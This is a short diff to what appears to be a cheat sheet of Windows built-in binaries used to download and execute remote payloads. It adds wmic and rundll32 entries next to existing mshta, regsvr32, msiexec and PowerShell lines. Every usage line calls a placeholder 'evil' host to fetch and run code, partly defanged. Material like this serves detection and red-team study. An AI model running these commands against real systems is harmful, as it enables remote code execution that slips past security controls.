@@ -9,7 +9,8 @@ Regsvr32
 MSHTA
 Powershell
 msiexec
-curl
+wmic
+
 
 Usage :
 mshta.exe https[:]//evil/evil[.]hta
@@ -17,6 +18,8 @@ mshta evil[.]hta
 regSvr32 /s /n /u /i:http[:]//evil.php/evil.sct scrobj.dll
 MSIEXEC /j m evil[.]msi
 msiexec /q /i http[:]//evil/evil[.]msi 
+wmic os get /FORMAT:"http://evil/evil[.]xsl"
+rundll3.exe \\evil\evil.dll,0
 Powershell:Invoke-WebRequest -Uri $url -OutFile $outpu
 Powershell:(New-Object System.Net.WebClient).DownloadFile($url, $output
 Powershell:Start-BitsTransfer -Source $url -Destination $output -Asynchronous
